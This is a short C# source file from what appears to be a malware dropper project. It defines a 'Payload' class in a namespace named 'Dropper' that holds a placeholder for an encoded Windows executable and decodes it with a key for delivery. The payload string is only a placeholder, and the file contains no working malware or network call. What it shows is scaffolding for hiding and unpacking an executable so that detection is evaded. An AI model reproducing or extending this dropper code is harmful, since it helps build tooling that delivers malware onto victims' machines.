﻿namespace Dropper
{
    class Payload
    {
        private static readonly string payload = "YOUR_ENCODED_PE_STRING_HERE";

        public static byte[] GetPayload(string key)
        {
            return XZip64.Decode(payload, key);
        }
    }
}
